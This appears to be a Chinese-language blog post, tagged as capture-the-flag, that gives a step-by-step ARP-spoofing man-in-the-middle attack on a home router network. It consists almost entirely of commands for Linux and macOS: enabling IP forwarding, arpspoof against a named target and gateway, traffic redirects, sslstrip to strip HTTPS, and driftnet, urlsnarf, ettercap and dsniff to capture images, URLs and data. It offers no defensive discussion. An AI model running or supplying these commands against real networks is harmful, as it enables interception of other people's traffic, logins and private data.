---
layout: post
categories: ctf
title: Arp 欺骗获取设备信息
date: 2019-09-05 17:00:57 +0800
description: arp 渗透
keywords: arp 中间攻击 渗透
---



家庭路由器中间人攻击以及数据获取。


## Arp过程介绍

### Linux 


```bash
# 开启端口转发
echo 1 >/proc/sys/net/ipv4/ip_forward
# 监控图片
driftnet -i eth0 -d ~/Desktop/pic -a
driftnet -i eth0
# 监控 URL
urlsnarf -i eth0
# 通过iptables 转发

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>

# 欺骗目标机器
arpspoof  -i eth0 -t 192.168.2.165 192.168.2.1
# 欺骗网关
arpspoof -i eth0  -t 192.168.2.1 192.168.2.150

# 过滤欺骗
arpspoof -i eth0 -c own -t 192.168.2.213 192.168.2.1 

## sslstrip -l  <yourListenPort>
#负责截获数据 
sslstrip 
## 开启抓包工具
wirewhark 
```

### mac 

```bash
rdr pass on en0 proto tcp from any to any port 80 -> 127.0.0.1 port 8080

sslstrip -l 8080 

# 修改 /etc/pf.conf 文件，在适当的位置加入
rdr-anchor "http-forwarding"

load anchor "http-forwarding" from "/etc/pf.anchors/http"

# 重启 packet filter，依次输入命令 sudo pfctl -ef /etc/pf.conf 和 sudo pfctl -E

# 转发 sudo sysctl -w net.inet.ip.forwarding=1
# 查看转发情况 sudo sysctl -a | grep forward

# arpspoof -i en0 -t (目标IP) (网关IP)
arpspoof -i en0 -t 10.196.17.58 10.196.17.1

arpspoof -i en0 -t 10.196.17.1 10.196.17.24

# 截获流量 
sudo ettercap -G
# 选择target1

# 网关 欺骗 dsniff -i eth0
```


### filter

```bash
ip.src==192.168.2.213 and http
``` 


转载请注明出处，本文采用 [CC4.0](http://creativecommons.org/licenses/by-nc-nd/4.0/) 协议授权
